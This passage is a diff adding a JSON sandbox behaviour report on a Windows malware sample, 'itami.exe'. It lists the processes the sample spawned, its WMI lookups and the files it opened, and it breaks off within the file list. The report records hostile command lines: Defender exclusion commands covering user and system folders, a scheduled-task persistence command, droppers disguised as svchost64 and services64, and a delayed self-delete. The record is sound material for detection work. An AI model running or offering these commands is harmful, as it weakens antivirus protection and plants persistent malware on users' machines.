@@ -1,0 +1,2785 @@
+{
+  "processes_injected": [
+    "C:\\Windows\\explorer.exe"
+  ],
+  "processes_terminated": [
+    "%CONHOST% \"-40542629874978953113508502101955653726-2142237983-15632340143136557-1740783057",
+    "%CONHOST% \"15356416371858698971616655065-173220822-1013455786442835643-1696652431-72816561",
+    "%CONHOST% \"-12634762094492256852052013660509700669-6441467901049579719-680129457-131011644",
+    "%CONHOST% \"-332040313-94977547718957146-1428574376-696280166283831804-1774593772-1460146805",
+    "%CONHOST% \"-2110733797-1198848899-10704337151274322012-2051096861505498860-2032469123-1205974262",
+    "explorer.exe \"%windir%\\system32\\services64.exe\"",
+    "%windir%\\explorer.exe /factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b} -Embedding",
+    "\"%windir%\\System32\\services64.exe\" ",
+    "powershell  -Command Add-MpPreference -ExclusionPath '%HOME%' ",
+    "\"pwsh.exe\" -Command Add-MpPreference -ExclusionPath '%HOME%'",
+    "%SAMPLEPATH%",
+    "\"%ComSpec%\" /c %TEMP%\\svchost64.exe \"%SAMPLEPATH%\"",
+    "%TEMP%\\svchost64.exe  \"%SAMPLEPATH%\"",
+    "\"%windir%\\system32\\services64.exe\" ",
+    "powershell  -Command Add-MpPreference -ExclusionPath '%TEMP%' ",
+    "\"pwsh.exe\" -Command Add-MpPreference -ExclusionPath '%TEMP%'",
+    "powershell  -Command Add-MpPreference -ExclusionPath '%APPDATA%' ",
+    "\"pwsh.exe\" -Command Add-MpPreference -ExclusionPath '%APPDATA%'",
+    "powershell  -Command Add-MpPreference -ExclusionPath '%windir%' ",
+    "\"pwsh.exe\" -Command Add-MpPreference -ExclusionPath '%windir%'",
+    "\"%ComSpec%\" /c schtasks /create /f /sc onlogon /rl highest /tn \"services64\" /tr '\"%windir%\\system32\\services64.exe\"' & exit",
+    "schtasks  /create /f /sc onlogon /rl highest /tn \"services64\" /tr '\"%windir%\\system32\\services64.exe\"' ",
+    "\"%ComSpec%\" /C choice /C Y /N /D Y /T 3 & Del \"%TEMP%\\svchost64.exe\"",
+    "choice  /C Y /N /D Y /T 3 ",
+    "\"cmd\" /c powershell -Command Add-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Add-MpPreference -ExclusionPath '%AppData%' & powershell -Command Add-MpPreference -ExclusionPath '%Temp%' & powershell -Command Add-MpPreference -ExclusionPath '%SystemRoot%' & exit",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "C:\\Windows\\System32\\cmd.exe",
+    "C:\\Windows\\System32\\conhost.exe",
+    "%SAMPLEPATH%\\03bd9a94482f180bb047626cb2f27ccf8daa0e201345480b43585580e09c311b.exe",
+    "C:\\Windows\\System32\\schtasks.exe",
+    "%USERPROFILE%\\AppData\\Local\\Temp\\svchost64.exe",
+    "C:\\Windows\\System32\\choice.exe",
+    "C:\\Windows\\System32\\services64.exe",
+    "powershell -Command Add-MpPreference -ExclusionPath C:\\\\Users\\\\admin",
+    "itami.exe",
+    "powershell -Command Add-MpPreference -ExclusionPath C:\\\\Users\\\\<USER>\\\\AppData\\\\Roaming",
+    "schtasks /create /f /sc onlogon /rl highest /tn services64 /tr \"C:\\\\Windows\\\\system32\\\\services64.exe\"",
+    "C:\\Windows\\System32\\cmd.exe /c schtasks /create /f /sc onlogon /rl highest /tn services64 /tr \"C:\\\\Windows\\\\system32\\\\services64.exe\" & exit",
+    "powershell -Command Add-MpPreference -ExclusionPath C:\\\\Users\\\\<USER>\\\\AppData\\\\Local\\\\Temp",
+    "C:\\Users\\<USER>\\AppData\\Local\\Temp\\svchost64.exe C:\\Users\\<USER>\\Downloads\\itami.exe",
+    "C:\\Windows\\System32\\cmd.exe /c C:\\Users\\<USER>\\AppData\\Local\\Temp\\svchost64.exe C:\\Users\\<USER>\\Downloads\\itami.exe",
+    "choice /C Y /N /D Y /T 3",
+    "C:\\Windows\\System32\\cmd.exe /C choice /C Y /N /D Y /T 3 & Del C:\\Users\\<USER>\\AppData\\Local\\Temp\\svchost64.exe",
+    "powershell -Command Add-MpPreference -ExclusionPath C:\\\\Windows",
+    "cmd /c powershell -Command Add-MpPreference -ExclusionPath %UserProfile% & powershell -Command Add-MpPreference -ExclusionPath %AppData% & powershell -Command Add-MpPreference -ExclusionPath %Temp% & powershell -Command Add-MpPreference -ExclusionPath %SystemRoot% & exit",
+    "C:\\Windows\\system32\\services64.exe",
+    "2688 - \"cmd\" /c powershell -Command Add-MpPreference -ExclusionPath '%%UserProfile%%' & powershell -Command Add-MpPreference -ExclusionPath '%%AppData%%' & powershell -Command Add-MpPreference -ExclusionPath '%%Temp%%' & powershell -Command Add-MpPreference -ExclusionPath '%%SystemRoot%%' & exit",
+    "2752 - powershell  -Command Add-MpPreference -ExclusionPath 'C:\\Users\\admin' ",
+    "2180 - powershell  -Command Add-MpPreference -ExclusionPath 'C:\\Users\\admin\\AppData\\Roaming' ",
+    "1472 - \"C:\\Windows\\System32\\cmd.exe\" /c C:\\Users\\admin\\AppData\\Local\\Temp\\svchost64.exe \"C:\\Users\\admin\\Downloads\\itami.exe\"",
+    "2788 - C:\\Users\\admin\\AppData\\Local\\Temp\\svchost64.exe  \"C:\\Users\\admin\\Downloads\\itami.exe\"",
+    "2400 - powershell  -Command Add-MpPreference -ExclusionPath 'C:\\Users\\admin\\AppData\\Local\\Temp' ",
+    "1652 - \"C:\\Windows\\System32\\cmd.exe\" /c schtasks /create /f /sc onlogon /rl highest /tn \"services64\" /tr '\"C:\\Windows\\system32\\services64.exe\"' & exit",
+    "772 - schtasks  /create /f /sc onlogon /rl highest /tn \"services64\" /tr '\"C:\\Windows\\system32\\services64.exe\"' ",
+    "2892 - \"C:\\Windows\\system32\\services64.exe\" "
+  ],
+  "system_property_lookups": [
+    "Select CommandLine from Win32_Process where Name='explorer.exe'",
+    "IWbemServices::Connect",
+    "MI_Session::Invoke",
+    "IWbemServices::ExecMethod - root\\Microsoft\\Windows\\Defender : MSFT_MpPreference::Add"
+  ],
+  "mutexes_created": [
+    "\\Sessions\\1\\BaseNamedObjects\\Global\\SyncRootManager",
+    "\\Sessions\\1\\BaseNamedObjects\\Local\\ZonesCacheCounterMutex",
+    "\\Sessions\\1\\BaseNamedObjects\\Local\\ZonesLockedCacheCounterMutex"
+  ],
+  "files_opened": [
+    "<Anonymous Pipe>",
+    "\\PSHost.132777415785472896.1992.DefaultAppDomain.powershell",
+    "\\PSHost.132777415837521828.3016.DefaultAppDomain.powershell",
+    "\\PSHost.132777415851398394.2112.DefaultAppDomain.powershell",
+    "\\PSHost.132777415864769081.2464.DefaultAppDomain.powershell",
+    "\\PSHost.132777415972973135.1692.DefaultAppDomain.powershell",
+    "\\PSHost.132777415989514431.3752.DefaultAppDomain.powershell",
+    "\\PSHost.132777416005653790.2828.DefaultAppDomain.powershell",
+    "\\PSHost.132777416019138289.2508.DefaultAppDomain.powershell",
+    "C:\\Windows\\SYSTEM32\\MSCOREE.DLL.local",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscoreei.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\clr.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\mscorwks.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll",
+    "C:\\Users\\<USER>\\Downloads\\itami.exe.config",
+    "C:\\Users\\<USER>\\Downloads\\itami.exe",
+    "C:\\Windows\\system32\\VERSION.dll",
+    "C:\\Windows\\system32\\VCRUNTIME140_CLR0400.dll",
+    "C:\\Windows\\system32\\ucrtbase_clr0400.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\config\\machine.config",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\fusion.localgac",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\fe2524177eb3088c77be666722039f52\\mscorlib.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\fe2524177eb3088c77be666722039f52\\mscorlib.ni.dll.aux",
+    "C:\\Users\\",
+    "C:\\Users\\<USER>\\Downloads\\",
+    "C:\\Users\\<USER>\\",
+    "C:\\Windows\\system32\\rpcss.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\itami\\",
+    "C:\\Users\\<USER>\\Downloads\\itami.INI",
+    "C:\\Windows\\system32\\api-ms-win-core-xstate-l2-1-0.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clrjit.dll",
+    "C:\\Windows\\assembly\\pubpol24.dat",
+    "C:\\Windows\\assembly\\GAC\\PublisherPolicy.tme",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\e43dd9c73ab5615e461bf5109c3facd6\\System.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\e43dd9c73ab5615e461bf5109c3facd6\\System.ni.dll.aux",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\nlssorting.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\SortDefault.nlp",
+    "C:\\Windows\\system32\\bcrypt.dll",
+    "C:\\Users\\admin",
+    "C:\\Users\\<USER>\\AppData\\Roaming",
+    "C:\\Users\\Default\\AppData\\Roaming",
+    "C:\\Windows\\system32\\CRYPTSP.dll",
+    "C:\\Windows\\system32\\rsaenh.dll",
+    "\\Device\\NamedPipe\\",
+    "C:\\Users\\<USER>\\Downloads",
+    "C:\\Windows\\system32\\cmd.exe",
+    "C:\\Windows\\system32\\apphelp.dll",
+    "C:\\Program Files (x86)\\Common Files\\Oracle\\Java\\javapath\\",
+    "C:\\Windows\\system32\\",
+    "C:\\Windows\\",
+    "C:\\Windows\\System32\\Wbem\\",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\",
+    "C:\\Windows\\system32\\mscoree.dll.local",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe.config",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Pb378ec07#\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Pb378ec07#\\b0fcf106681758b7af5211cc1367fc8e\\Microsoft.PowerShell.ConsoleHost.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Pb378ec07#\\b0fcf106681758b7af5211cc1367fc8e\\Microsoft.PowerShell.ConsoleHost.ni.dll.aux",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Core\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Core\\0d59b0e237d7519417de10cd84bda4e7\\System.Core.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Core\\0d59b0e237d7519417de10cd84bda4e7\\System.Core.ni.dll.aux",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\08a991e54142198a258c6c3824708d25\\System.Management.Automation.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\08a991e54142198a258c6c3824708d25\\System.Management.Automation.ni.dll.aux",
+    "C:\\Windows\\assembly\\GAC_64\\System.Management.Automation.resources\\3.0.0.0_en-US_31bf3856ad364e35\\System.Management.Automation.resources.dll",
+    "C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation.resources\\3.0.0.0_en-US_31bf3856ad364e35\\System.Management.Automation.resources.dll",
+    "C:\\Windows\\assembly\\GAC\\System.Management.Automation.resources\\3.0.0.0_en-US_31bf3856ad364e35\\System.Management.Automation.resources.dll",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\en-US\\System.Management.Automation.resources.dll",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\en-US\\System.Management.Automation.resources\\System.Management.Automation.resources.dll",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\en-US\\System.Management.Automation.resources.exe",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\en-US\\System.Management.Automation.resources\\System.Management.Automation.resources.exe",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorrc.dll",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "C:\\Windows\\system32\\en-US\\KERNELBASE.dll.mui",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psm1",
+    "C:\\Windows\\system32",
+    "C:\\Windows\\SysWOW64",
+    "C:\\Program Files",
+    "C:\\Windows\\system32\\MSISIP.DLL",
+    "C:\\Windows\\system32\\wshext.dll",
+    "C:\\Windows\\WinSxS\\amd64_microsoft.windows.common-controls_6595b64144ccf1df_5.82.7601.18837_none_a4d981ff711297b6",
+    "C:\\Windows\\WinSxS\\amd64_microsoft.windows.common-controls_6595b64144ccf1df_5.82.7601.18837_none_a4d981ff711297b6\\COMCTL32.dll",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pwrshsip.dll",
+    "C:\\Windows\\assembly\\GAC_64\\Microsoft.PowerShell.ConsoleHost.resources\\3.0.0.0_en-US_31bf3856ad364e35\\Microsoft.PowerShell.ConsoleHost.resources.dll",
+    "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.PowerShell.ConsoleHost.resources\\3.0.0.0_en-US_31bf3856ad364e35\\Microsoft.PowerShell.ConsoleHost.resources.dll",
+    "C:\\Windows\\assembly\\GAC\\Microsoft.PowerShell.ConsoleHost.resources\\3.0.0.0_en-US_31bf3856ad364e35\\Microsoft.PowerShell.ConsoleHost.resources.dll",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\en-US\\Microsoft.PowerShell.ConsoleHost.resources.dll",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\en-US\\Microsoft.PowerShell.ConsoleHost.resources\\Microsoft.PowerShell.ConsoleHost.resources.dll",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\en-US\\Microsoft.PowerShell.ConsoleHost.resources.exe",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\en-US\\Microsoft.PowerShell.ConsoleHost.resources\\Microsoft.PowerShell.ConsoleHost.resources.exe",
+    "CONOUT$",
+    "C:\\Users\\<USER>\\AppData\\Local",
+    "C:\\Users\\<USER>\\AppData\\Local\\Microsoft\\Windows\\PowerShell",
+    "C:\\Users\\<USER>\\AppData\\Local\\Microsoft\\Windows",
+    "C:\\Users\\<USER>\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive",
+    "C:\\Windows\\system32\\tzres.dll",
+    "C:\\Windows\\system32\\en-US\\tzres.dll.mui",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Data\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Data\\7bed49c46de9295a8453db205c60a028\\System.Data.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Data\\7bed49c46de9295a8453db205c60a028\\System.Data.ni.dll.aux",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Xml\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Xml\\5ee35debfc22f727e70e4479ddcbc045\\System.Xml.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Xml\\5ee35debfc22f727e70e4479ddcbc045\\System.Xml.ni.dll.aux",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Management\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Management\\b221af81285c1305324612e6dc9c88ff\\System.Management.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Management\\b221af81285c1305324612e6dc9c88ff\\System.Management.ni.dll.aux",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Dired13b18a9#\\",
+    "C:\\Program Files (x86)\\Common Files\\Oracle\\Java\\javapath\\",
+    "C:\\Program Files (x86)\\WindowsPowerShell\\Modules\\",
+    "C:\\Program Files (x86)\\WindowsPowerShell\\Modules\\Microsoft.PowerShell.Operation.Validation\\",
+    "C:\\Program Files (x86)\\WindowsPowerShell\\Modules\\PackageManagement\\",
+    "C:\\Program Files (x86)\\WindowsPowerShell\\Modules\\Pester\\",
+    "C:\\Program Files (x86)\\WindowsPowerShell\\Modules\\PowerShellGet\\",
+    "C:\\Program Files\\WindowsPowerShell\\Modules\\",
+    "C:\\Program Files\\WindowsPowerShell\\Modules\\Microsoft.PowerShell.Operation.Validation\\",
+    "C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\",
+    "C:\\Program Files\\WindowsPowerShell\\Modules\\PackageManagement\\",
+    "C:\\Program Files\\WindowsPowerShell\\Modules\\Pester\\",
+    "C:\\Program Files\\WindowsPowerShell\\Modules\\PowerShellGet\\",
+    "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2102.4-0\\MPCLIENT.DLL",
+    "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2102.4-0\\MpOav.dll",
+    "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2102.4-0\\MsMpLics.dll",
+    "C:\\ProgramData\\chocolatey\\bin\\",
+    "C:\\Users\\user\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\itami.exe.log",
+    "C:\\Users\\user\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\services64.exe.log",
+    "C:\\Users\\user\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\svchost64.exe.log",
+    "C:\\Users\\user\\AppData\\Local\\Microsoft\\WindowsApps\\",
+    "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\Caches",
+    "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\Caches\\cversions.1.db",
+    "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\Caches\\{AFBF9F1A-8EE8-4C77-AF34-C647E37CA0D9}.1.ver0x0000000000000016.db",
+    "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\ModuleAnalysisCache",
+    "C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive",
+    "C:\\Users\\user\\AppData\\Local\\Programs\\Python\\Python39\\",
+    "C:\\Users\\user\\AppData\\Local\\Programs\\Python\\Python39\\Scripts\\",
+    "C:\\Users\\user\\AppData\\Local\\Temp",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\JSAMSIProvider64.dll",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_dezdqqbs.0iy.ps1",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_dezdqqbs.0iy.ps1\\",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ehwww3j4.nwj.ps1",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ehwww3j4.nwj.ps1\\",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ksnrixfy.zsj.psm1",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_mpnen4uo.0jd.psm1",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_urbqvbub.fom.ps1",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_urbqvbub.fom.ps1\\",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\__PSScriptPolicyTest_z2p22j2q.23w.psm1",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\svchost64.exe",
+    "C:\\Users\\user\\AppData\\Local\\Temp\\svchost64.exe.config",
+    "C:\\Users\\user\\Desktop\\desktop.ini",
+    "C:\\Users\\user\\Desktop\\itami.exe",
+    "C:\\Users\\user\\Desktop\\itami.exe.config",
+    "C:\\Users\\user\\Desktop\\itami.exe:Zone.Identifier",
+    "C:\\Users\\user\\Desktop\\itami.exe\\:Zone.Identifier:$DATA",
+    "C:\\Users\\user\\Documents\\desktop.ini",
+    "C:\\Users\\user\\Downloads\\desktop.ini",
+    "C:\\Users\\user\\Music\\desktop.ini",
+    "C:\\Users\\user\\OneDrive\\desktop.ini",
+    "C:\\Users\\user\\Pictures\\desktop.ini",
+    "C:\\Users\\user\\Videos\\desktop.ini",
+    "C:\\Windows\\AppPatch\\sysmain.sdb",
+    "C:\\Windows\\Globalization\\Sorting\\sortdefault.nls",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\clr.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\mscorwks.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\machine.config",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clrjit.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\config\\machine.config",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscoreei.dll",
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorrc.dll",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_64\\System.Data\\v4.0_4.0.0.0__b77a5c561934e089\\System.Data.dll",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_64\\System.Data\\v4.0_4.0.0.0__b77a5c561934e089\\System.Data.dll.config",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_64\\System.Transactions\\v4.0_4.0.0.0__b77a5c561934e089\\System.Transactions.dll",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_64\\System.Transactions\\v4.0_4.0.0.0__b77a5c561934e089\\System.Transactions.dll.config",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System.IO.Compression\\v4.0_4.0.0.0__b77a5c561934e089\\System.IO.Compression.dll",
+    "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll",
+    "C:\\Windows\\SYSTEM32\\ATL.DLL",
+    "C:\\Windows\\SYSTEM32\\CLDAPI.dll",
+    "C:\\Windows\\SYSTEM32\\CRYPTBASE.dll",
+    "C:\\Windows\\SYSTEM32\\CRYPTSP.dll",
+    "C:\\Windows\\SYSTEM32\\DPAPI.DLL",
+    "C:\\Windows\\SYSTEM32\\MSCOREE.DLL",
+    "C:\\Windows\\SYSTEM32\\Microsoft.Management.Infrastructure.Native.Unmanaged.DLL",
+    "C:\\Windows\\SYSTEM32\\OpcServices.DLL",
+    "C:\\Windows\\SYSTEM32\\PROPSYS.dll",
+    "C:\\Windows\\SYSTEM32\\SSPICLI.DLL",
+    "C:\\Windows\\SYSTEM32\\SspiCli.dll",
+    "C:\\Windows\\SYSTEM32\\USERENV.dll",
+    "C:\\Windows\\SYSTEM32\\VCRUNTIME140_CLR0400.dll",
+    "C:\\Windows\\SYSTEM32\\VERSION.dll",
+    "C:\\Windows\\SYSTEM32\\XmlLite.dll",
+    "C:\\Windows\\SYSTEM32\\amsi.dll",
+    "C:\\Windows\\SYSTEM32\\apphelp.dll",
+    "C:\\Windows\\SYSTEM32\\bcrypt.dll",
+    "C:\\Windows\\SYSTEM32\\cmd.exe",
+    "C:\\Windows\\SYSTEM32\\edputil.dll",
+    "C:\\Windows\\SYSTEM32\\en-US\\PROPSYS.dll.mui",
+    "C:\\Windows\\SYSTEM32\\en-US\\cmd.exe.mui",
+    "C:\\Windows\\SYSTEM32\\en-US\\tzres.dll.mui",
+    "C:\\Windows\\SYSTEM32\\en-US\\winnlsres.dll.mui",
+    "C:\\Windows\\SYSTEM32\\gpapi.dll",
+    "C:\\Windows\\SYSTEM32\\iertutil.dll",
+    "C:\\Windows\\SYSTEM32\\mi.dll",
+    "C:\\Windows\\SYSTEM32\\mintdh.DLL",
+    "C:\\Windows\\SYSTEM32\\mintdh.dll",
+    "C:\\Windows\\SYSTEM32\\miutils.dll",
+    "C:\\Windows\\SYSTEM32\\mscoree.dll",
+    "C:\\Windows\\SYSTEM32\\ntdll.dll",
+    "C:\\Windows\\SYSTEM32\\ntmarta.dll",
+    "C:\\Windows\\SYSTEM32\\ole32.dll",
+    "C:\\Windows\\SYSTEM32\\secur32.dll",
+    "C:\\Windows\\SYSTEM32\\tdh.dll",
+    "C:\\Windows\\SYSTEM32\\tzres.dll",
+    "C:\\Windows\\SYSTEM32\\ucrtbase_clr0400.dll",
+    "C:\\Windows\\SYSTEM32\\urlmon.dll",
+    "C:\\Windows\\SYSTEM32\\wbemcomn.dll",
+    "C:\\Windows\\SYSTEM32\\winnlsres.dll",
+    "C:\\Windows\\SYSTEM32\\wldp.dll",
+    "C:\\Windows\\System32",
+    "C:\\Windows\\System32\\",
+    "C:\\Windows\\System32\\AppLocker\\MDM",
+    "C:\\Windows\\System32\\AppxSip.dll",
+    "C:\\Windows\\System32\\KERNEL32.dll",
+    "C:\\Windows\\System32\\KERNELBASE.dll",
+    "C:\\Windows\\System32\\MSISIP.DLL",
+    "C:\\Windows\\System32\\OneCoreUAPCommonProxyStub.dll",
+    "C:\\Windows\\System32\\OpenSSH\\",
+    "C:\\Windows\\System32\\SspiCli.dll",
+    "C:\\Windows\\System32\\Wbem\\",
+    "C:\\Windows\\System32\\WinTypes.dll",
+    "C:\\Windows\\System32\\Windows.StateRepositoryPS.dll",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ConfigDefender\\ConfigDefender.psd1",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ConfigDefender\\MSFT_MpComputerStatus.cdxml",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ConfigDefender\\MSFT_MpPreference.cdxml",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ConfigDefender\\MSFT_MpScan.cdxml",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ConfigDefender\\MSFT_MpSignature.cdxml",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ConfigDefender\\MSFT_MpThreat.cdxml",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ConfigDefender\\MSFT_MpThreatCatalog.cdxml",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ConfigDefender\\MSFT_MpThreatDetection.cdxml",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ConfigDefender\\MSFT_MpWDOScan.cdxml",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psm1",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\en-US\\powershell.exe.mui",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe.Config",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe.config",
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pwrshsip.dll",
+    "C:\\Windows\\System32\\XmlLite.dll",
+    "C:\\Windows\\System32\\cmd.exe",
+    "C:\\Windows\\System32\\en-US\\CRYPT32.dll.mui",
+    "C:\\Windows\\System32\\en-US\\cmd.exe.mui",
+    "C:\\Windows\\System32\\en-US\\user32.dll.mui",
+    "C:\\Windows\\System32\\services64.exe:Zone.Identifier",
+    "C:\\Windows\\System32\\taskschd.dll",
+    "C:\\Windows\\System32\\wshext.dll",
+    "C:\\Windows\\WinSxS\\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.17134.1304_none_d3fbe61b7c93d9f0",
+    "C:\\Windows\\WinSxS\\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.17134.1304_none_d3fbe61b7c93d9f0\\comctl32.DLL",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.M870d558a#\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.M870d558a#\\693872fe61faf634359e9c5808ee0222\\Microsoft.Management.Infrastructure.Native.ni.dll",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.M870d558a#\\693872fe61faf634359e9c5808ee0222\\Microsoft.Management.Infrastructure.Native.ni.dll.aux",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Mf49f6405#\\",
+    "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Mf49f6405#\\e5c9865ceab3d51e44db885cd3377ee0\\Microsoft.Management.Infrastructure.ni.dll",
